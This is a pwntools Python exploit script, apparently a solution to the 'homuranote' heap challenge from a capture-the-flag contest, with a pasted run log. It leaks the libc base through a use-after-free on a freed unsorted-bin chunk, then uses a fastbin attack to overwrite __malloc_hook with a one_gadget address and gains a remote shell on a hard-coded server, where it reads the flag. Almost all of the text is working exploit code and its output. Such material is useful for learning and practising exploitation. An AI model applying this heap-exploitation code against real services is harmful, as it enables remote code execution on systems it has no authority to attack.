from pwn import *

#context.log_level="debug"
context.arch="amd64"

#r=process('./homuranote')
r=remote('111.231.88.121',6666)
elf=ELF('homuranote')
libc=ELF('libc-2.24.so')

#libc_syst=libc.symbols['system']
#libc_exit=libc.symbols['exit']
libc_arenaOffset=0x397b00
libc_mallochook=0x397af0
libc_oneGadget1=0x3f306 #rax==NULL
libc_oneGadget2=0x3f35a #rsp+0x30==NULL
libc_oneGadget3=0xd694f #rsp+0x60==NULL

def addnote(content):
	r.sendlineafter("choice>>","1")
	r.sendlineafter("Size:",str(len(content)))
	r.sendlineafter("Content:",content)
def shownote(index):
	r.sendlineafter("choice>>","2")
	r.sendlineafter("Index:",str(index))
def editnote(index,content):
	r.sendlineafter("choice>>","3")
	r.sendlineafter("Index:",str(index))
	r.sendline(content)
def deletenote(index):
	r.sendlineafter("choice>>","4")
	r.sendlineafter("Index:",str(index))

success('Leak Address')
#unsorted bins -> main_arena -> libcBase
addnote('a'*0x7f+'\x00')#0
addnote('b'*0x7f+'\x00')#1
deletenote(0)
shownote(0)
MainArena_addr=u64(r.recvline().strip().ljust(8,'\x00'))-88#gdb-gef > heap arenas
LibcBase_addr=MainArena_addr-libc_arenaOffset
OneGadget=libc_oneGadget3+LibcBase_addr
mlchk_addr=LibcBase_addr+libc_mallochook
#syst_addr=LibcBase_addr+libc_syst
#exit_addr=LibcBase_addr+libc_exit
log.success("MainArenaAddr: "+hex(MainArena_addr))
log.success("LibcBaseAddr:  "+hex(LibcBase_addr))
log.success("ONE_GADGET:    "+hex(OneGadget))
log.success("__malloc_hook: "+hex(mlchk_addr))
#log.success("SYSTEM_Addr:   "+hex(syst_addr))
#log.success("EXIT_Addr:     "+hex(exit_addr))
deletenote(1)

success('Fastbin Attack')
#fakeFD -> fakeSize -> override __malloc_hook to OneGadget
fakeContent=p64(mlchk_addr-0x20-3).ljust(8,'\x00')+0x58*'\x00'#locate a fake size to fill with a chunk
padding='\x00'*(0x10+3)+p64(OneGadget).ljust(8,'\x00')+'\x00'*(0x58-0x10-3)
padding=padding.ljust(0x60,'\x00')	
addnote('A'*0x60)#2
addnote('B'*0x60)#3
deletenote(2)
deletenote(3)# 3->2
editnote(3,fakeContent)# 2<-3=fakeFD
addnote('C'*0x60)#2/4 select the original chunk2
addnote(padding)#3/5 select the original chunk3 -> where the fakeFD point to
#DO NOT RECV after call malloc
'''
$ add
$ 1
$ 256
$ cat flag*
flag{Good_job!_Have_fun_in_sast!}
'''
r.interactive()

'''
cossack@ubuntu:~/Desktop/PWN/NJUPT_CGCTF/HomuraNote$ python test1.py
[+] Opening connection to 111.231.88.121 on port 6666: Done
[*] '/home/cossack/Desktop/PWN/NJUPT_CGCTF/HomuraNote/homuranote'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/cossack/Desktop/PWN/NJUPT_CGCTF/HomuraNote/libc-2.24.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Leak Addr
[+] MainArenaAddr: 0x7ff7b8d37b00
[+] LibcBaseAddr:  0x7ff7b89a0000
[+] SYSTEM_Addr:   0x7ff7b89df480
[+] EXIT_Addr:     0x7ff7b89d5980
[+] ONE_GADGET:    0x7ff7b8a7694f
[+] __malloc_hook: 0x7ff7b8d37af0
[+] Fastbin Attack
[*] Switching to interactive mode
Ok,index:5.
1.add
2.show
3.edit
4.delete
5.exit
choice>>$ 1
Size:$ 256
$ aaa
UH\x89�H��dH\x8b\x04%(: 1: aaa: not found
$ ls
flag81359
$ cat flag*
flag{Good_job!_Have_fun_in_sast!}
$ ls

'''